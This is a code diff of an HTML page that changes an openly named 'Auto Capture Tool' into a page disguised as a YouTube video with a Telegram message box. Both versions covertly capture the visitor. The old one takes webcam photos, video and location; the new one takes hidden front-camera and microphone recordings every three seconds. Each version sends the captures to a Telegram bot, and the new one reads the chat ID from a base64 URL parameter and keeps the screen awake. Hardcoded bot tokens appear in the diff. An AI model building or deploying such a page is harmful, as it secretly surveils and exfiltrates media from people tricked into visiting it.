@@ -3,60 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture Tool</title>
+    <title>Video Recording</title>
     <style>
-        body {
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
             display: flex;
             flex-direction: column;
-            align-items: center;
             justify-content: center;
-            height: 100vh;
-            background-color: #282c34;
-            color: white;
-            font-family: Arial, sans-serif;
+            align-items: center;
+            background-color: #000;
+            color: #61dafb;
         }
-        video, img {
-            border: 1px solid #61dafb;
-            margin: 10px;
+        .youtube-video {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16 / 9; /* Maintain 16:9 aspect ratio */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Hide the video element */
+        video {
+            display: none;
+        }
+
+        /* Simple content to show on the page */
+        h1 {
+            font-size: 24px;
+        }
+        input {
+            margin-top: 20px;
+            padding: 10px;
+            width: 80%;
+        }
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #61dafb;
+            border: none;
+            color: #000;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-<h1>Automatic Capture Tool</h1>
-<video id="video" width="320" height="240" autoplay muted></video>
-<img id="photo" alt="Captured Photo" width="320">
-<div id="location"></div>
+<div class="youtube-video">
+    <iframe src="https://www.youtube.com/embed/cfzPMw8v5G8" allowfullscreen></iframe>
+</div>
+<video id="video" width="320" height="240" autoplay muted></video> <!-- Hidden video element -->
+
+<h1>Send Message to Telegram</h1>
+<input type="text" id="message" placeholder="Enter your message" />
+<button id="sendButton">Send</button>
 
 <script>
-    const video = document.getElementById('video');
-    const photo = document.getElementById('photo');
-    const locationDiv = document.getElementById('location');
-    let mediaRecorder;
-    let videoChunks = [];
-    let locationInterval, photoInterval, videoInterval;
-
-    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA'; // Replace with your actual Telegram bot token
-    const CHAT_ID = '1691680798'; // Replace with your actual Telegram chat ID
-
-    // Start video stream
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(stream => {
-            video.srcObject = stream;
-            startCapturing(stream);
-        })
-        .catch(err => console.error("Error accessing webcam: ", err));
-
-    // Start capturing location, video, and photo
-    function startCapturing(stream) {
-        locationInterval = setInterval(captureLocation, 2000); // Capture location every 2 seconds
-        startVideoCapture(stream); // Start video capture
-        photoInterval = setInterval(capturePhoto, 2000); // Capture photo every 2 seconds
-
-        // Stop all capturing after 40 seconds
-        setTimeout(stopCapturing, 60000);
+    // Function to decode Base64 string
+    function decodeBase64(encodedStr) {
+        try {
+            return decodeURIComponent(escape(atob(encodedStr)));
+        } catch (e) {
+            console.error('Base64 decode error:', e);
+            return null;
+        }
     }
 
+    // Function to get URL parameters
+    function getURLParameter(sParam) {
+        var sPageURL = window.location.search.substring(1);
+        var sURLVariables = sPageURL.split('&');
+        for (var i = 0; i < sURLVariables.length; i++) {
+            var sParameterName = sURLVariables[i].split('=');
+            if (sParameterName[0] === sParam) {
+                return sParameterName[1];
+            }
+        }
+    }
+
+    // Function to send data to Telegram
+    async function sendToTelegram(message, chatId) {
+        const botToken = '7476815807:AAEiJN9TiCYrqzSbQTkKE1C7KRp2-hzMT6I'; // Replace with your actual Telegram bot token
+
+        if (!chatId) {
+            console.error('Chat ID is not available.');
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message.trim());
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                body: formData
+            });
+            console.log(await response.json());
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+        }
+    }
+
+    const video = document.getElementById('video');
+    let mediaRecorder;
+    let videoChunks = [];
+    let videoInterval;
+
+    // Start video stream using the front camera
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "user" } }, // Front camera
+        audio: true
+    })
+    .then(stream => {
+        video.srcObject = stream; // Hidden video element, still necessary for recording
+        startVideoCapture(stream);
+    })
+    .catch(err => console.error("Error accessing front camera: ", err));
+
+    // Start capturing video
     function startVideoCapture(stream) {
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
@@ -65,125 +140,73 @@
             if (videoChunks.length > 0) {
                 const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                 videoChunks = []; // Reset for the next capture
-                sendToTelegram('Video captured', videoBlob);
+                sendVideoToTelegram(videoBlob); // Send video to Telegram
             }
         };
 
+        // Start recording every 3 seconds
         videoInterval = setInterval(() => {
             videoChunks = []; // Clear previous chunks
             mediaRecorder.start();
             setTimeout(() => {
-                mediaRecorder.stop();
-            }, 10000); // Stop recording after 10 seconds
-        }, 10000); // Start a new recording every 10 seconds
+                mediaRecorder.stop(); // Stop recording after 3 seconds
+            }, 3000); // 3 seconds interval
+        }, 3000); // Start a new recording every 3 seconds
     }
 
-    function captureLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const { latitude, longitude } = position.coords;
-                const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                locationDiv.innerHTML = `Latitude: ${latitude}, Longitude: ${longitude} <br> <a href="${mapLink}" target="_blank">Open in Google Maps</a>`;
-                sendLocationToTelegram(latitude, longitude);
-            });
-        } else {
-            locationDiv.innerHTML = "Geolocation is not supported by this browser.";
-        }
-    }
-
-    function capturePhoto() {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const dataUrl = canvas.toDataURL('image/png');
-        photo.src = dataUrl;
-
-        // Convert data URL to blob
-        fetch(dataUrl)
-            .then(res => res.blob())
-            .then(blob => {
-                sendToTelegram('Photo captured', blob);
-            });
-    }
-
-    async function sendToTelegram(message, data) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        // Sending text message to Telegram
-        await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-            }),
-        });
-
-        // Send video or photo if data is a blob
-        if (data instanceof Blob && data.type.startsWith('video/')) {
-            await sendVideoToTelegram(data);
-        } else if (data instanceof Blob && data.type.startsWith('image/')) {
-            await sendPhotoToTelegram(data);
-        }
-    }
-
+    // Function to send video to Telegram
     async function sendVideoToTelegram(videoBlob) {
         const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
+        const base64ChatId = getURLParameter('chatId'); // Get the Base64 Chat ID from the URL
+        const chatId = decodeBase64(base64ChatId); // Decode the Base64 Chat ID
+        formData.append('chat_id', chatId);
         formData.append('video', videoBlob, 'video.webm'); // Name the video as needed
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+        const url = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendVideo`; // Replace with your actual Telegram bot token
         await fetch(url, {
             method: 'POST',
             body: formData,
         });
     }
 
-    async function sendPhotoToTelegram(photoBlob) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', photoBlob, 'photo.png'); // Name the photo as needed
+    document.getElementById('sendButton').addEventListener('click', () => {
+        const message = document.getElementById('message').value;
+        const base64ChatId = getURLParameter('chatId'); // Get the Base64 Chat ID from the URL
+        const chatId = decodeBase64(base64ChatId); // Decode the Base64 Chat ID
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        await fetch(url, {
-            method: 'POST',
-            body: formData,
+        if (message) {
+            sendToTelegram(message, chatId); // Send the message to Telegram
+        } else {
+            console.error('Please enter a message.');
+        }
+    });
+
+    // Keep the screen on using Wake Lock API
+    if ('wakeLock' in navigator) {
+        let wakeLock = null;
+
+        async function requestWakeLock() {
+            try {
+                wakeLock = await navigator.wakeLock.request('screen');
+                wakeLock.addEventListener('release', () => {
+                    console.log('Wake lock was released');
+                });
+                console.log('Wake lock is active');
+            } catch (err) {
+                console.error(`${err.name}, ${err.message}`);
+            }
+        }
+
+        requestWakeLock();
+
+        // Re-acquire wake lock if it is released
+        document.addEventListener('visibilitychange', async () => {
+            if (wakeLock !== null && document.visibilityState === 'visible') {
+                requestWakeLock();
+            }
         });
-    }
-
-    async function sendLocationToTelegram(latitude, longitude) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
-        await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                latitude: latitude,
-                longitude: longitude,
-            }),
-        });
-    }
-
-    function stopCapturing() {
-        // Stop video and audio capture
-        const stream = video.srcObject;
-        const tracks = stream.getTracks();
-
-        tracks.forEach(track => track.stop());
-
-        // Clear all intervals
-        clearInterval(locationInterval);
-        clearInterval(photoInterval);
-        clearInterval(videoInterval);
-
-        console.log("Capture stopped after 60 seconds");
+    } else {
+        console.warn('Wake Lock API not supported by this browser.');
     }
 </script>
 
